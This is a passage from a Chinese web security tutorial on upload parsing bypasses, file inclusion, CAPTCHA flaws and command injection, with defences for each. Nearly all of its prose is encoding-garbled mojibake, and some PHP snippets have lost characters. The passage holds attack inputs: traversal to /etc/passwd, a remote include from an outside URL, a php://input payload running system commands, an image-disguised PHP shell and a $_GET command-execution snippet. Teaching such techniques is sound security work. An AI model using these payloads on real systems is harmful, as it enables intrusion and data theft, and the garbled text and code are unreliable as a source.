ä¸Šå­—ç¬¦ä¸²â€/ä»»æ„æ–‡ä»¶å.phpâ€å°±ä¼šæŒ‰ç…§phpçš„æ–¹å¼åŽ»è§£æžã€‚ 3.Nginx è§£æžæ¼æ´žï¼š è§£æžï¼šabc/def.php æˆ– abc%00.php ï¼ˆå…¶ä¸­abcã€deféƒ½ä¸ºä»»æ„æ–‡ä»¶åï¼‰ æè¿°ï¼šç›®å‰Nginx ä¸»è¦æœ‰è¿™ä¸¤ç§æ¼æ´žï¼Œä¸€ä¸ªæ˜¯å¯¹ä»»æ„æ–‡ä»¶åï¼Œåœ¨åŽé¢æ·»åŠ /abc.php çš„è§£æžæ¼æ´žï¼Œå¦‚åŽŸæœ¬æ–‡ä»¶åæ˜¯test.jpgåˆ™å¯ä»¥æ·»åŠ ä¸ºtest.jpg/x.phpè¿›è¡Œè§£æžæ”»å‡»ã€‚è¿˜æœ‰ä¸€ç§æ˜¯å¯¹ä½Žç‰ˆæœ¬çš„Nginx å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ååŽé¢æ·»åŠ %00.php è¿›è¡Œè§£æžæ”»å‡»ã€‚ 4.è§£æžæ¼æ´žæ€»ç»“ï¼š Apacheçš„æ‰©å±•åé¡ºåºè§£æžæ¼æ´žï¼šApacheè‡ªèº«çš„æ¼æ´ž IISçš„asp è§£æžæ¼æ´žï¼šIISè‡ªèº«çš„æ¼æ´ž Nginxçš„%00 è§£æžæ¼æ´žï¼šNginxè‡ªèº«çš„æ¼æ´ž php-cgiçš„é»˜è®¤é…ç½®æ¼æ´žï¼šè¿™ç±»ä»¥CGI å½¢å¼è°ƒç”¨phpçš„web åº”ç”¨ç¨‹åºä¸»è¦å‡ºçŽ°åœ¨IISå’ŒNginxï¼›è€ŒApache é€šå¸¸æ˜¯ä»¥module çš„å½¢å¼åŽ»è°ƒç”¨phpï¼Œæ‰€ä»¥å¾ˆå°‘å‡ºçŽ°è¯¥ç±»åž‹æ¼æ´žã€‚ å››ã€æ£€æµ‹æ–¹æ³•ç®€å•ç‚¹çš„æ–¹æ³•å°±æ˜¯ç›´æŽ¥ä¸Šä¼ å„ç§ç±»åž‹çš„æ–‡ä»¶ï¼Œå†é€šè¿‡Burpsuiteä¿®æ”¹å„ä¸ªå¯ä»¥ç»•è¿‡çš„æ£€æµ‹å†…å®¹æ¥æ£€æµ‹ã€‚ äº”ã€é˜²å¾¡æ–¹æ³•ç®€å•çš„é˜²å¾¡æ–¹æ³•ä¸ºï¼šèŽ·å–æ–‡ä»¶æ‰©å±•åè¿›è¡Œç™½åå•å¯¹æ¯”ï¼Œç„¶åŽå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚å½“ç„¶è‹¥å­˜åœ¨è§£æžæ¼æ´žç­‰å®¹æ˜“è¢«ç»•è¿‡ï¼Œå…·ä½“ç‚¹çš„é˜²å¾¡æ–¹æ³•å¦‚ä¸‹ï¼š 1ã€å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ï¼šé€šå¸¸ä¸ºæ£€æµ‹æ–‡ä»¶æ‰©å±•å) 2ã€æœåŠ¡ç«¯MIME ç±»åž‹æ£€æµ‹ï¼šæ£€æµ‹Content-Typeå†…å®¹) 3ã€æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹ï¼šæ£€æµ‹è·Ÿpathå‚æ•°ç›¸å…³çš„å†…å®¹ 4ã€æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼šæ£€æµ‹è·Ÿæ–‡ä»¶extension ç›¸å…³çš„å†…å®¹ ï¼ˆ1ï¼‰ é»‘åå•æ£€æµ‹ï¼š æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼šå¦‚ AsPï¼ŒpHpã€‚ åå•åˆ—è¡¨ç»•è¿‡ï¼šç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•ï¼Œå¦‚ asa æˆ– cer ç­‰ã€‚ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼šæ¯”å¦‚å‘é€çš„ http åŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆ test.asp. æˆ– test.asp (åŽé¢ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨ Windowsç³»ç»Ÿé‡Œæ˜¯ä¸èƒ½ç›´æŽ¥ä¿®æ”¹çš„ï¼Œéœ€è¦åœ¨Burpsuiteç­‰ä»£ç†ä¸­è¿›è¡Œä¿®æ”¹ï¼Œç„¶åŽç»•è¿‡éªŒè¯åŽï¼Œä¼šè¢«Windowsç³»ç»Ÿè‡ªåŠ¨åŽ»æŽ‰åŽé¢çš„ç‚¹å’Œç©ºæ ¼ï¼Œä½†ä¹Ÿåªèƒ½ç”¨åœ¨Windowsç³»ç»Ÿä¸­ã€‚ 0x00 æˆªæ–­ç»•è¿‡ åŒæ‰©å±•åè§£æžç»•è¿‡æ”»å‡»ï¼š (1)åŸºäºŽWebæœåŠ¡çš„è§£æžé€»è¾‘ï¼šå¦‚æžœä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸ºhelp.asp.123ï¼Œæ‰©å±•å123 ä¸åœ¨æ‰©å±•åé»‘åå•ä¸­ä¹Ÿæ²¡åœ¨Apache å¯è§£æžæ‰©å±•ååˆ—è¡¨ä¸­ï¼Œæ­¤æ—¶ä¼šå‘å‰æœå¯»ä¸‹ä¸€ä¸ªå¯è§£æžçš„æ‰©å±•åï¼Œè‹¥æœå¯»åˆ°.phpï¼Œåˆ™ä¼šä»¥php æ‰§è¡Œã€‚ (2) åŸºäºŽWebæœåŠ¡çš„è§£æžæ–¹å¼ï¼šå¦‚æžœåœ¨Apacheçš„conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯test2.php.jpgä¹Ÿä¼šä»¥php æ¥æ‰§è¡Œã€‚ å±é™©è§£æžç»•è¿‡æ”»å‡»ï¼šåŸºäºŽWebæœåŠ¡çš„è§£æžæ–¹å¼ï¼šå¦‚æžœåœ¨Apache çš„conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯jpgï¼Œä¸€æ ·èƒ½ä»¥php æ–¹å¼æ‰§è¡Œã€‚ .htaccess æ–‡ä»¶æ”»å‡»ï¼šé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ã€‚ è§£æžè°ƒç”¨/æ¼æ´žç»•è¿‡ï¼šç›´æŽ¥é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„éžé»‘åå•æ–‡ä»¶å³å¯ï¼Œå†åˆ©ç”¨è§£æžè°ƒç”¨/æ¼æ´ž ï¼ˆ2ï¼‰ ç™½åå•æ£€æµ‹ï¼š 0x00 æˆªæ–­ç»•è¿‡ï¼šå¦‚test.asp%00.jpg çš„æ–¹å¼è¿›è¡Œæˆªæ–­ï¼Œå±žäºŽç™½åå•æ–‡ä»¶ï¼Œå†åˆ©ç”¨æœåŠ¡ç«¯ä»£ç çš„æ£€æµ‹é€»è¾‘æ¼æ´žè¿›è¡Œæ”»å‡» è§£æžè°ƒç”¨/æ¼æ´žç»•è¿‡ï¼šç›´æŽ¥é…åˆä¸Šä¼ ä¸€ä¸ªä»£ç æ³¨å…¥è¿‡çš„ç™½åå•æ–‡ä»¶ï¼Œå†åˆ©ç”¨è§£æžè°ƒç”¨/æ¼æ´ž .htaccessæ–‡ä»¶æ”»å‡»ï¼šæ— è®ºæ˜¯é»‘åå•è¿˜æ˜¯ç™½åå•éƒ½å¯ä»¥ç›´æŽ¥æ”»å‡».htaccess æ–‡ä»¶ å¦‚æžœPHP å®‰å…¨æ²¡é…ç½®å¥½ï¼Œå°±å¯ä»¥é€šè¿‡move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æŽ‰æœåŠ¡å™¨ä¸Šçš„ï¼Œè¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æžåå•äº†ã€‚ 5ã€æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹(æ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ) ï¼š ï¼ˆ1ï¼‰æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼š ä¸»è¦æ˜¯æ£€æµ‹æ–‡ä»¶å†…å®¹å¼€å§‹å¤„çš„æ–‡ä»¶å¹»æ•°ï¼Œè¦ç»•è¿‡çš„è¯éœ€è¦åœ¨æ–‡ä»¶å¼€å¤´å†™ä¸Šæ£€æµ‹çš„å€¼ï¼Œæ¯”å¦‚å›¾ç‰‡ç±»åž‹çš„æ–‡ä»¶å¹»æ•°å¦‚ä¸‹ï¼š JPGæ–‡ä»¶ï¼š GIFæ–‡ä»¶ï¼š PNGæ–‡ä»¶ï¼š ç„¶åŽåœ¨æ–‡ä»¶å¹»æ•°åŽé¢åŠ ä¸Šä»£ç å³å¯ã€‚ ï¼ˆ2ï¼‰æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ï¼š å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯getimagesize()å‡½æ•°ï¼Œéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ å¥½ï¼Œå°±æ˜¯åœ¨å¹»æ•°çš„åŸºç¡€ä¸Šè¿˜åŠ äº†ä¸€äº›æ–‡ä»¶ä¿¡æ¯ï¼Œç»“æž„å¦‚ä¸‹ï¼š GIF89a 123(...some binary data for image...) &lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) ï¼ˆ3ï¼‰æ–‡ä»¶åŠ è½½æ£€æµ‹ï¼š ä¸€èˆ¬æ˜¯è°ƒç”¨API æˆ–å‡½æ•°åŽ»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼Œç”šè‡³æ˜¯è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ï¼ˆè¿‡æ»¤æ•ˆæžœå‡ ä¹Žæœ€å¼ºï¼‰ã€‚ å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼ï¼šä»£ç æ³¨å…¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨å›¾åƒå¤„ç†è½¯ä»¶å¯¹ä¸€å¼ å›¾ç‰‡è¿›è¡Œä»£ç æ³¨å…¥ï¼Œä½†æ–‡ä»¶ç»“æž„æ˜¯å®Œæ•´çš„ï¼Œæ¸²æŸ“æµ‹è¯•åŸºæœ¬ä¸Šéƒ½èƒ½ç»•è¿‡ã€‚ç”¨winhexæŸ¥çœ‹æ•°æ®å¯ä»¥åˆ†æžå‡ºè¿™ç±»å·¥å…·çš„åŽŸç†æ˜¯åœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¼šæ˜¯å›¾ç‰‡çš„æ³¨é‡ŠåŒºã€‚ å¯¹äºŒæ¬¡æ¸²æŸ“çš„æ”»å‡»æ–¹å¼ï¼šæ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº«ï¼Œå¸¸è§çš„å°±æ˜¯æº¢å‡ºæ”»å‡»ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶åŽæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åŠ è½½å™¨ä¼šä¸»åŠ¨è¿›è¡ŒåŠ è½½æµ‹è¯•ï¼ŒåŠ è½½æµ‹è¯•æ—¶è¢«æº¢å‡ºæ”»å‡»æ‰§è¡Œshellcodeæ¯”å¦‚access/mdb æº¢å‡ºï¼›äºŒæ¬¡æ¸²æŸ“ç›¸å½“äºŽæ˜¯æŠŠåŽŸæœ¬å±žäºŽå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­éžå›¾åƒæ•°æ®çš„éƒ¨åˆ†ç›´æŽ¥å°±è¢«éš”ç¦»å¼€äº†ã€‚ ç¤ºä¾‹ä»£ç ï¼š 12345678function image_gd_open(file, extension) &#123; extension = str_replace('jpg', 'jpeg', extension); open_func = 'imageCreateFrom'. extension; //å‡½æ•°åå˜æˆimageCreateFrompng ä¹‹ç±» if (!function_exists($open_func)) &#123; return FALSE; &#125; return open_func(file); //å˜æˆimagecreatefrompng('/tmp/php0lbTOn') &#125; æ–‡ä»¶åŒ…å«æ¼æ´žä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ ç®€å•åœ°è¯´ï¼Œå°±æ˜¯åœ¨é€šè¿‡å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œç”±äºŽæ²¡æœ‰å¯¹åŒ…å«çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤å¤„ç†ï¼Œè¢«æ”»å‡»è€…åˆ©ç”¨ä»Žè€Œå¯¼è‡´äº†åŒ…å«äº†Webæ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶è¿›æ¥ï¼Œå°±ä¼šå¯¼è‡´æ–‡ä»¶ä¿¡æ¯çš„æ³„éœ²ç”šè‡³æ³¨å…¥äº†æ¶æ„ä»£ç ã€‚ è¿™é‡Œä¸»è¦é’ˆå¯¹PHPè¯­è¨€ã€‚ PHPä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•° include()ï¼šåªæœ‰ä»£ç æ‰§è¡Œåˆ°è¯¥å‡½æ•°æ—¶æ‰ä¼šåŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šå¹¶ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ include_once()ï¼šå’Œinclude()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºŽå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚ require()ï¼šåªè¦ç¨‹åºæ‰§è¡Œå°±åŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ä¼šè¾“å‡ºé”™è¯¯ç»“æžœå¹¶ç»ˆæ­¢è¿è¡Œã€‚ require_once()ï¼šå’Œrequire()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºŽå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´žçš„ä¸€èˆ¬ç‰¹å¾ ?page=a.php ?home=a.html ?file=content ç›®å½•éåŽ†ï¼ˆDirectory traversalï¼‰å’Œæ–‡ä»¶åŒ…å«ï¼ˆFile includeï¼‰çš„ä¸€äº›åŒºåˆ« ç›®å½•éåŽ†æ˜¯å¯ä»¥è¯»å–webæ ¹ç›®å½•ä»¥å¤–çš„å…¶ä»–ç›®å½•ï¼Œæ ¹æºåœ¨äºŽweb applicationçš„è·¯å¾„è®¿é—®æƒé™è®¾ç½®ä¸ä¸¥ï¼Œé’ˆå¯¹çš„æ˜¯æœ¬ç³»ç»Ÿã€‚ æ–‡ä»¶åŒ…å«æ˜¯é€šè¿‡includeå‡½æ•°å°†webæ ¹ç›®å½•ä»¥å¤–çš„ç›®å½•çš„æ–‡ä»¶è¢«åŒ…å«è¿›æ¥ï¼Œåˆ†ä¸ºLFIæœ¬åœ°æ–‡ä»¶åŒ…å«å’ŒRFIè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚ å‡ ç§ç»å…¸çš„æµ‹è¯•æ–¹æ³• ?file=../../../../../etc/passwdd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt ï¼ˆé€šè¿‡å¤šä¸ª../å¯ä»¥è®©ç›®å½•å›žåˆ°æ ¹ç›®å½•ä¸­ç„¶åŽå†è¿›å…¥ç›®æ ‡ç›®å½•ï¼‰ ç¼–ç ç»•è¿‡å­—ç¬¦è¿‡æ»¤ å¯ä»¥ä½¿ç”¨å¤šç§ç¼–ç æ–¹å¼è¿›è¡Œç»•è¿‡ %00åµŒå…¥ä»»æ„ä½ç½® .çš„åˆ©ç”¨ äºŒã€æ–‡ä»¶åŒ…å«æ¼æ´žçš„åˆ©ç”¨æŠ€å·§åŒ…å«æ¼æ´žä¸Šä¼ æŠ€å·§ï¼š ä¸€èˆ¬å°†ä¸€å¥è¯æœ¨é©¬å’Œå›¾ç‰‡è¿›è¡Œç»‘å®šä¸Šä¼ ã€‚ åŒ…å«è¯»æ–‡ä»¶ï¼š å¦‚http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php åŒ…å«å†™æ–‡ä»¶ï¼š æž„é€ URLï¼šhttp://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://inputï¼Œå¹¶ä¸”æäº¤POSTæ•°æ®ä¸ºï¼š 1&lt;?php system(&apos;net user&apos;);?&gt; ç­‰ åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼š å½“å­˜åœ¨PHPæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´žï¼Œä½†æ— æ³•ä¸Šä¼ æ­£å¸¸æ–‡ä»¶æ—¶ï¼Œå¯ä»¥åˆ©ç”¨Apacheæ—¥å¿—æ–‡ä»¶ã€‚ApacheæœåŠ¡å™¨è¿è¡ŒåŽä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼Œapacheçš„æ—¥å¿—æ–‡ä»¶è®°å½•ä¸‹æˆ‘ä»¬çš„æ“ä½œï¼Œå¹¶ä¸”å†™åˆ°è®¿é—®æ—¥å¿—æ–‡ä»¶access.logä¹‹ä¸­ï¼Œä¾‹å¦‚ï¼š http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log PHPå†…ç½®çš„åè®®ï¼š ä¸‰ã€æ£€æµ‹æ–¹æ³•æ‰¾åˆ°æœ‰åŒ…å«å‡½æ•°çš„é¡µé¢ï¼Œå¯¹å‡½æ•°å†…å®¹è¿›è¡Œæ›¿æ¢æŸ¥çœ‹ç»“æžœï¼› å¯ä»¥ä½¿ç”¨å·¥å…·æ¥ä»£æ›¿æ‰‹å·¥çš„è¿‡ç¨‹ï¼Œå¦‚Kadimusã€Burpsuiteçš„æ’ä»¶LFI scanner checksç­‰ï¼› ç™½ç›’æµ‹è¯•æ—¶ï¼Œå¯ä»¥åœ¨æºä»£ç ä¸­æŸ¥çœ‹allow_url_fopenã€allow_url_includeç­‰æ•æ„Ÿå‡½æ•°æ˜¯å¦å¼€å¯ã€‚ å››ã€é˜²å¾¡æ–¹æ³•1ã€ä¸¥æ ¼åˆ¤æ–­åŒ…å«ä¸­çš„å‚æ•°æ˜¯å¦å¤–éƒ¨å¯æŽ§ã€‚ 2ã€è·¯å¾„é™åˆ¶ï¼Œé™åˆ¶è¢«åŒ…å«çš„æ–‡ä»¶åªèƒ½åœ¨æŸä¸€ä¸ªæ–‡ä»¶å¤¹å†…ï¼Œç‰¹åˆ«æ˜¯ä¸€å®šè¦ç¦æ­¢ç›®å½•è·³è½¬å­—ç¬¦ï¼Œå¦‚ï¼šâ€œ../â€ã€‚ 3ã€åŸºäºŽç™½åå•çš„åŒ…å«æ–‡ä»¶éªŒè¯ï¼ŒéªŒè¯è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚ 4ã€å°½é‡ä¸è¦ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œå¯ä»¥åœ¨éœ€è¦åŒ…å«çš„é¡µé¢å›ºå®šå†™å¥½ï¼Œå¦‚ï¼šâ€œinclude(â€œhead.phpâ€)â€ã€‚ 5ã€å¯ä»¥é€šè¿‡è°ƒç”¨str_replace()å‡½æ•°å®žçŽ°ç›¸å…³æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤ï¼Œä¸€å®šç¨‹åº¦ä¸Šé˜²å¾¡äº†è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚ ä¸å®‰å…¨çš„éªŒè¯ç ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ éªŒè¯ç é—®é¢˜å½’ç±»ä¸ºé€»è¾‘æ¼æ´žç±»é—®é¢˜ï¼Œé€šå¸¸æ˜¯å¼€å‘è€…ç¼–å†™ä»£ç æ—¶å­˜åœ¨è®¾è®¡ç¼ºé™·ã€å¯å¯¼è‡´æŸäº›ç‰¹æ®Šæƒ…å†µä½¿å¾—éªŒè¯ç å¯è¢«ç»•è¿‡ï¼Œä»Žè€Œä½¿å¾—éªŒè¯ç çš„é˜²å¾¡æœºåˆ¶å½¢åŒè™šè®¾ã€‚ åŽŸç†è¿‡ç¨‹ 1.å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ 2.æœåŠ¡ç«¯å“åº”å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ SessionID åŒæ—¶ç”Ÿæˆä¸€ä¸ªéšæœºéªŒè¯ç  3.æœåŠ¡ç«¯å°†éªŒè¯ç å’Œ SessionID ä¸€å¹¶è¿”å›žç»™å®¢æˆ·ç«¯ 4.å®¢æˆ·ç«¯æäº¤éªŒè¯ç è¿žåŒ SessionID ç»™æœåŠ¡ç«¯ 5.æœåŠ¡ç«¯éªŒè¯éªŒè¯ç åŒæ—¶é”€æ¯å½“å‰ä¼šè¯ï¼Œè¿”å›žç»™å®¢æˆ·ç«¯ç»“æžœ äºŒã€éªŒè¯ç çš„å®‰å…¨é—®é¢˜å®¢æˆ·ç«¯é—®é¢˜ï¼š 1ã€ å®¢æˆ·ç«¯ç”ŸæˆéªŒè¯ç ï¼šéªŒè¯ç ç”±å®¢æˆ·ç«¯ JSç”Ÿæˆå¹¶ä¸”ä»…ä»…åœ¨å®¢æˆ·ç«¯ç”¨JSéªŒè¯ã€‚ 2ã€ éªŒè¯ç è¾“å‡ºå®¢æˆ·ç«¯ï¼šè¾“å‡ºåœ¨HTMLä¸­ï¼Œä¸åº”è¯¥æŠŠéªŒè¯ç çš„å†…å®¹å‘é€åˆ°å®¢æˆ·ç«¯ cookie æˆ–è¾“å‡ºåˆ°response headersçš„å…¶ä»–å­—æ®µä¸­ã€‚ 3ã€ éªŒè¯ç è¾“å‡ºåœ¨ cookie ä¸­ï¼šæœ‰äº›ç³»ç»Ÿé»˜è®¤ä¸æ˜¾ç¤ºéªŒè¯ç ï¼Œè€Œæ˜¯åœ¨ç”¨æˆ·æ ¡éªŒé”™è¯¯ä¸€å®šæ¬¡æ•°ä¹‹åŽå†å‡ºçŽ°ã€‚é‚£å¦‚ä½•åˆ¤æ–­ç”¨æˆ·å·²ç»é”™è¯¯å‡ æ¬¡äº†å‘¢ï¼Ÿè‹¥æ˜¯å¦‚ä¸‹åˆ¤æ–­ï¼š ï¼ˆ1ï¼‰åœ¨ cookie ä¸­å†™å…¥ä¸€ä¸ªæ ‡è®°ï¼Œæ¯”å¦‚ loginErr = 1ï¼ŒåŽç»­é”™è¯¯ç´¯åŠ  ï¼ˆ2ï¼‰åœ¨ session ä¸­å†™å…¥ä¸€ä¸ªæ ‡è®°ï¼Œä¾‹å¦‚ loginErr = 1ï¼ŒåŽç»­é”™è¯¯ç´¯åŠ  è¿™æ ·é—®é¢˜åœ¨äºŽï¼Œè¦æ˜¯æ”»å‡»è€…ä¸å¸¦ Cookie æäº¤ HTTP è¯·æ±‚æˆ–ä¸æ›´æ–° Cookieä¸­ loginErr çš„å€¼åå¤æäº¤ï¼Œè¿™æ ·ç¨‹åºä¼šå› ä¸ºæ— ä»ŽèŽ·å– Cookie/sessionIDï¼Œä¼šè®¤ä¸ºæ”»å‡»è€…æ˜¯é¦–æ¬¡è®¿é—®ï¼Œä»Žè€ŒéªŒè¯ç ä¸ä¼šå‡ºçŽ°ã€‚ æœåŠ¡å™¨ç«¯é—®é¢˜ï¼š 1ã€ éªŒè¯ç ä¸è¿‡æœŸï¼Œæ²¡æœ‰åŠæ—¶é”€æ¯ä¼šè¯å¯¼è‡´éªŒè¯ç å¤ç”¨ 2ã€ æ²¡æœ‰è¿›è¡Œéžç©ºåˆ¤æ–­ 3ã€ äº§ç”Ÿçš„éªŒè¯ç é—®é¢˜é›†å†…çš„ç­”æ¡ˆéžå¸¸æœ‰é™ ä¸‰ã€æ£€æµ‹æ–¹æ³•ç®€å•çš„æ–¹æ³•ï¼Œå…ˆæ˜¯æ‰‹å·¥ç™»å½•å‡ æ¬¡ï¼ŒæŸ¥çœ‹æ˜¯å¦å‡ºçŽ°éªŒè¯ç ä»¥åŠéªŒè¯ç æ˜¯å¦å¤±æ•ˆï¼Œç„¶åŽå†é€šè¿‡Burpsuiteæ¥è¿›ä¸€æ­¥æµ‹è¯•ã€‚ å››ã€é˜²å¾¡æ–¹æ³•1ã€ å¼ºåˆ¶è¦æ±‚è¾“å…¥éªŒè¯ç ï¼Œå¦åˆ™å¿…é¡»å®žæ–½ IP ç­–ç•¥ã€‚æ³¨æ„ä¸è¦è¢« X-Forwarded-Forï¼ˆç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿žæŽ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŽŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µï¼‰ ç»•è¿‡äº†ã€‚ 2ã€ éªŒè¯ç åªèƒ½ç”¨ä¸€æ¬¡ï¼Œç”¨å®Œç«‹å³è¿‡æœŸã€‚ 3ã€ éªŒè¯ç å¼ºåº¦å¢žå¼ºï¼Œä½¿ç”¨æ‰­æ›²ã€å˜å½¢ã€å¹²æ‰°çº¿æ¡ã€å¹²æ‰°èƒŒæ™¯è‰²ã€å˜æ¢å­—ä½“ç­‰ã€‚ 4ã€ å¤§ç½‘ç«™æœ€å¥½ç»Ÿä¸€å®‰å…¨éªŒè¯ç ï¼Œå„å¤„ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç æŽ¥å£ã€‚ å‘½ä»¤æ³¨å…¥æ¼æ´žä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºåŽ»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚PHPä¸­çš„systemã€execã€shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æŽ§åˆ¶å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯ä»¥æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæžœã€‚ è¿™é‡Œä»¥PHPä¸ºä¸»ï¼Œä»¥åŽåœ¨Javaåˆ†ç±»ä¸­ä¼šå•ç‹¬æ€»ç»“Javaç±»çš„æ¼æ´žã€‚ æˆå›  ç¨‹åºæœªä¸¥æ ¼åŒºåˆ†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¯æ•°æ®è¿˜æ˜¯ä»£ç ã€‚ PHPä¸Žå‘½ä»¤æ‰§è¡Œæ¼æ´žç›¸å…³çš„å‡½æ•° 1ã€PHPçš„5ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šsystem()ã€exec()ã€passthru()ã€shell_exec()ã€è¿ç®—ç¬¦ 2ã€å‘½ä»¤æ‰§è¡Œå°é›†ï¼š 12345678910111213141516&lt;?phpcmd="system";ob_start(cmd);echo "_GET[cunlide]";ob_end_flush();echo "&lt;br&gt;";system("GET[cunlide]");echo "&lt;br&gt;";echo exec("$GET[cunlide]");echo "&lt;br&gt;";echo shell_exec("_GET[cunlide]");echo "&lt;br&gt;";echo passthru("GET[cunlide]");echo "&lt;br&gt;";echo `$GET[cunlide]`;?&gt; 3ã€PHPåŽé—¨æœ¨é©¬å¸¸ç”¨çš„å‡½æ•°ç±»åž‹ï¼š æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼šsystem, passthru, shell_exec, exec, popen, proc_open ä»£ç æ‰§è¡Œä¸ŽåŠ 